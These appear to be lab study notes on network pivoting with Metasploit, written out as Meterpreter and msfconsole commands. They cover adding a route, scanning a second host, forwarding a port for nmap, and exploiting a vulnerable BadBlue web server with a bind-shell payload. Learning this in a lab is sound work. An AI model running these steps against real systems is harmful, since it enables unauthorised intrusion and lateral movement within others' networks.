### Pivoting

*Notes: Initial access with HFS rejetto exploit / badBlue*

##### Add a route that will be used to run an auxiliary port scanner module on the second victim

*Meterpreter prompt*

> - run autoroute -s 10.0.23.0/20

##### Perform a TCP scan against a second target

> - background
> - use auxiliary/scanner/portscan/tcp
> - set RHOSTS 10.0.27.99
> - set PORTS 1-100
> - exploit

##### Configure port forwarding to perform service version detection

*Notes: Only the auxliary module use de routes added on meterpreter, in order to use other tools we have to configure port forwarding*

*Meterpreter prompt*

> - portfwd add -l 1234 -p 80 -r 10.0.27.99
> - portfwd list
> - nmap -sV -sS -p 1234 localhost

##### The second victim is running a vulnerable version of badblue

> - use exploit/windows/http/badblue_passthru
> - set PAYLOAD windows/meterpreter/bind_tcp
> - set RHOSTS 10.0.27.99
> - exploit
